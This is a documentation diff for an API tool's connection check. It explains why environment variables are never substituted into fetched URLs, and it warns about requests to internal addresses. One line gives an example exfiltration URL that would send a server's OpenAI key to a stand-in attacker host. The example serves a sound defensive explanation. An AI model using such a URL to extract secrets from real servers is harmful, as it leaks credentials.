@@ -323,11 +323,21 @@ A binding that is not valid gives a 200 response with `errors`. No error repeats
 was rejected. A request with the wrong shape gives a 422 response. Its message names each field
 and its reason, and never the input.
 
-An API that listens on `127.0.0.1` or `localhost` runs for one user, so it also reads its own
-environment, fetches the OpenAPI document or loads the start page, and checks that the API server
-answers. Any other API only validates the binding: `live` is `false` and `status` is
-`unchecked`, because a server that fetches any URL that a client sends is a risk.
-`METIS_API_CONNECTION_CHECK=1` or `0` overrides this.
+An API that listens on `127.0.0.1`, `localhost`, or `::1` runs for one user, so it also reports
+each named variable as set or not set in its own environment, fetches the OpenAPI document or
+loads the start page, and checks that the API server answers. Any other API only validates the
+binding: `live` is `false` and `status` is `unchecked`, because a server that fetches any URL that
+a client sends is a risk. `METIS_API_CONNECTION_CHECK=1` or `0` overrides this.
+
+The API never puts a value from its own environment into a URL that it requests. Otherwise a
+client could send `https://attacker.example/${OPENAI_API_KEY}` and receive the server's key. A
+`spec_url` or `start_url` that names a `${NAME}` variable is not requested: its probe says so, and
+`status` is `unchecked`. To check that URL, run `metis wizard connect` on the computer that has
+the variables.
+
+The live check still sends requests to any other URL that a client gives, including an internal
+address that only the API host can reach. Set `METIS_API_CONNECTION_CHECK=1` on a shared server
+only when that is acceptable.
 
 Check a binding:
 
